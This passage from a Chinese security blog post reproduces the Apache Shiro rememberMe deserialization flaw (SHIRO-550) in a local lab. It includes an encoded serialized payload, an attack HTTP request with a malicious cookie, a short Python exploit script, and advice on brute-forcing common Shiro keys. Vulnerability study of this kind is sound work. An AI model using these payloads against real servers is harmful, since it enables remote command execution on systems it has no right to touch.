8p6iASiNn+APRohWdO6Jyxgd0+vi91YVuxbnGOpa2gqfc83J55WFG6xVbzz1TdsB5SJmbqK7THX3HeggiifSoVURASuR42Zv49cR7SzsXfkZwh/3p5Yspav194hrwJgkfWCRKCNJ6EvzqHpWvDXvocoBvlZ+lne7+0K7UKYXm6vLoN0gMHpKbEs1o5LkSNOiomO5tcjFirk8l/wiMFJ566dBBFhqiJYDedUmQZQlBTYzIRgj4JgP96XF6yuFdRqWttubH1LuxQA8OmltCLXO7HTXtKhXJm5lIE8dSiruEZJd86K/lk8kHkSK/RI3YNLnULQkSmq68AAcpFstnnznX/oba58VyPIJVM2MdcHZk3oCNqeQe5Mj+lnlB5pqM+uo0Zpx/FISYVBgbVl/u6yq5Re0ofiKQPF11eP5nn1PDxTSmVKQuT46Nk8CQeODZOZRcVVZHpgNI9Yu4K2ZIOzIL0EpUfXlR2qpHPsQTJh61WjnK9bQSqgWsKyPafOgTufK11Vzx41adkDtgdZmXSAo65HcYVDqpC+TDIqSjm+nKR/6ohRJWJlArm+T+jAeTcR5ogSmDVeQoACZTCCfPqL0QfVxyl5JfCien70c6yaAG9RXr2wSNp9hWqU2qJoano+Z7Tmv/WFXDTcAzOjRUXFpicyedCy0NcL8cF+JxgVTFok8N0sdMxU5/o55rWn08aYpmiv1u1NupXWem8YZM9v19etOfqEppdGfxp9+M8s68AtYDutuk5fx0HGezCKcaKSpSsgq7+5oR8YF4g6fuVO0nNRhgP5RW8DQTzdNVpctRMW/k3RhMVhkRlZXJSwCUJKBL5iRq2HDRApdlRB1HEIh0btfkrLQo9tt9xKk4ofUnpQrhvWwmeASeNkvXDAPFPGRxBzOOtvILLk0ZZ3djWgt9bJ09+xWAu8T0vp526vQ9MU6BQvo103kNlaZzkGeW6XJfBpaPeGvka8OcMdOyDp8KyGSJnYvgeRudix8dRbs1eL4/YkVUsZRHUbyk2zXXcm2OVjggTnSP+d208kjwmVorciOnU+O2izUhPvSE45QuXLcBORzpXk75ysG6mDNWmUTAeNjcq1nY7y1ajHjt3Dkz1Bh/v5hOk8F3SGYHahbPS+pZdwT6Ruqwsv+HD7WWS9BUAvtsbyjps3gzRyhzcdIIzl6coGXt9SJdJB74Ng71dN1dSJa3eGB+WF4JUomSES/rHZ9gf+rPm3jeim6L0Vqcgg7T/PIXhxH95wPC8Ilm/Qqe7i0lS12O37ANidjWg4pjUz0/n8oB1LmLVHmsg=</span><br></pre></td></tr></table></figure></p>
+<p>请求包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /shiro_war/ HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7</span><br><span class="line">Cookie: JSESSIONID=2CFA012A33F4FEF42DEAEF52DF753BE0; rememberMe=qLM1jzIcQD2PvQzAzoXtR+uvtpKxHZKN6cf2cIif/STOUZeX17A/jSTPtdkL+uslcCJGxhDyJHUSXfXEgT4dQ5uP5OKE3vlXbzaZHzO3RwOXNL3yPq0/xy29T4t04Ge3IyyZKamlULLgY8eeCLPtSQXnFjVdfZMvtG3OBnmw2y8MUStsx81XlmxYzb5rJ+y1fFbEYuDCpKgyZEV725/mO1K7uF+0YAeOKvqhy7SXZZIMEYK5zvS+WrejN1cqulC7+BgO5M/pddBCku9IUvDDILcfQvw23n2i/acX9uNBWgLTem55JizPfBY+VdDmUZEKa26fWQZ38vo1ZcIWYgax6rcbZ0vMdKqBHOYmrh1dEB/0IX0YMKIUWqcIltm2cpVuckv29oe/+zppTOWDJxaVMzypgxupC8Tas1rNGPYJFqKxvF+BwVyPdJSHmFhZiOO6nO3BY5DY13AqIOthnjyEvy4FjoF2KygqC6uetPjBI5SyF1JKRNZ9D44H6······</span><br></pre></td></tr></table></figure></p>
+<p>发送请求后，可在本地弹出计算机。<br>如果需要执行其他命令，修改python脚本中<code>calc.exe</code>为指定命令即可，比如：<code>ping test.dnslog.cn</code>。</p>
+<h3 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h3><p>payload测试成功了，exp就方便多了，把payload部分生成的base64编码的字符串当作cookie，构造好请求包，向目标web服务发送请求即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:8080/shiro_war/&quot;</span><br><span class="line">headers = &#123;&apos;cookie&apos;: &apos;base64编码的字符串&apos;&#125;</span><br><span class="line">resp = requests.get(url=url, headers=headers)</span><br></pre></td></tr></table></figure></p>
+<h3 id="补充（为什么遍历KEY）"><a href="#补充（为什么遍历KEY）" class="headerlink" title="补充（为什么遍历KEY）"></a>补充（为什么遍历KEY）</h3><p>在学习EXP的时候，发现有遍历<code>Shiro Key</code>的操作。但是之前分析漏洞复现过程，并不需要遍历<code>Shiro Key</code>，<code>Shiro Key</code>是写死在源码里边的。后来，在长亭的一篇文章中找到答案，<code>国内不少程序员习惯性的 copy/paste，一些 Github 示例代码被直接复制到了项目中，这些示例中设置秘钥的代码也可能被一并带到项目中，这就给了安全人员可乘之机，后来出现的 Shiro Top 100 Key 便是基于此原理收集的</code>，于是便有了遍历<code>Shiro Key</code>的操作。</p>
+<h4 id="KEY遍历方法"><a href="#KEY遍历方法" class="headerlink" title="KEY遍历方法"></a>KEY遍历方法</h4><ol>
+<li>用不同的key去生成payload尝试执行。</li>
+<li>参看下面文章，利用是否返回deleteMe判断key是否正确。</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>// Shiro 反序列化记录<br><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/</a><br>// 分析调试apache shiro反序列化<br><a href="https://saucer-man.com/information_security/396.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/396.html</a><br>// [SHIRO-550] Randomize default remember me cipher - ASF JIRA<br><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a><br>// Shiro RememberMe 漏洞检测的探索之路<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651375430&amp;idx=3&amp;sn=55f366c056a88e635fa2f83b5de54b87&amp;chksm=8d39b6ceba4e3fd8be759495091117578e06428b7e68dbaaaed22036072aa5a874851b776b34&amp;mpshare=1&amp;scene=1&amp;srcid=0822fi9gjo9n1LRTp6KcZnKo&amp;sharer_sharetime=1598097675636&amp;sharer_shareid=0f7cbcda2c189098c2d3ec8732ed3f4f&amp;key=90349d069103c40382dd27867b5cfac7b4f78da0838ba3b4e1f913fbf38380a43610c3aa7891c59796542de6c1cea1637fb13fdf56d4c47f9e279609fd9eff1da09b244a486106cc943f908ff2543270ebeea9b096d2c68354e4cdc63b140571b7e523608b18c4014dcd4850475f3c89caf2b1414ef2f146f8322d6a8d5bde7b&amp;ascene=1&amp;uin=NTYyNDkzMzU%3D&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=AcCkdRnxmUdpwz3j5nL8VJc%3D&amp;pass_ticket=rQwB9fvlqcgWbOtKigmQIfMAYYyS4km2dadytrSRbUU%3D" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651375430&amp;idx=3&amp;sn=55f366c056a88e635fa2f83b5de54b87&amp;chksm=8d39b6ceba4e3fd8be759495091117578e06428b7e68dbaaaed22036072aa5a874851b776b34&amp;mpshare=1&amp;scene=1&amp;srcid=0822fi9gjo9n1LRTp6KcZnKo&amp;sharer_sharetime=1598097675636&amp;sharer_shareid=0f7cbcda2c189098c2d3ec8732ed3f4f&amp;key=90349d069103c40382dd27867b5cfac7b4f78da0838ba3b4e1f913fbf38380a43610c3aa7891c59796542de6c1cea1637fb13fdf56d4c47f9e279609fd9eff1da09b244a486106cc943f908ff2543270ebeea9b096d2c68354e4cdc63b140571b7e523608b18c4014dcd4850475f3c89caf2b1414ef2f146f8322d6a8d5bde7b&amp;ascene=1&amp;uin=NTYyNDkzMzU%3D&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=AcCkdRnxmUdpwz3j5nL8VJc%3D&amp;pass_ticket=rQwB9fvlqcgWbOtKigmQIfMAYYyS4km2dadytrSRbUU%3D</a><br>// 一种另类的 shiro 检测方式<br><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect</a></p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/java/"># java</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2100/11/03/软件官网下载地址/">软件官网下载地址</a>
+            
+            
+            <a class="next" rel="next" href="/2020/08/29/一次web漏扫项目记录-脚本编写/">一次web漏扫项目记录-脚本编写</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
